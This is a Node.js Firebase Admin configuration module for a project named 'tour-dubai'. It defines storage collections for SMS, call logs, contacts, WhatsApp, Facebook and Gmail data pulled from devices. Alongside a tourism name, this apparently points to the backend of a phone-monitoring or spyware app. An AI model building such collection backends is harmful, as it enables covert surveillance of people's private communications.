const admin = require('firebase-admin');
const path = require('path');

// Use the provided service account JSON file for admin SDK
const serviceAccount = require(path.join(__dirname, '../tour-dubai-79253-firebase-adminsdk-fbsvc-e1ef867688.json'));

// Initialize Firebase Admin
let firebaseApp;
try {
  firebaseApp = admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: 'https://tour-dubai-79253.firebaseio.com',
    storageBucket: 'tour-dubai-79253.appspot.com'
  });
} catch (error) {
  if (error.code === 'app/duplicate-app') {
    firebaseApp = admin.app();
  } else {
    console.error('Firebase initialization error:', error);
  }
}

// Get Firebase services
const db = admin.firestore();
const rtdb = admin.database();
const storage = admin.storage();
const auth = admin.auth();

// Firebase collections
const COLLECTIONS = {
  NOTIFICATIONS: 'notifications',
  MESSAGES: 'messages',
  SMS: 'sms',
  CONTACTS: 'contacts',
  CALL_LOGS: 'call_logs',
  EMAILS: 'emails',
  MEDIA: 'media',
  DEVICES: 'devices',
  USERS: 'users',
  FACEBOOK: 'facebook_data',
  WHATSAPP: 'whatsapp',
  GMAIL: 'gmail_data'
};

// Firebase Realtime Database paths
const RTDB_PATHS = {
  LIVE_DATA: 'live_data',
  SYNC_STATUS: 'sync_status',
  DEVICE_STATUS: 'device_status',
  REAL_TIME_UPDATES: 'real_time_updates'
};

module.exports = {
  admin,
  db,
  rtdb,
  storage,
  auth,
  COLLECTIONS,
  RTDB_PATHS,
  firebaseApp
}; 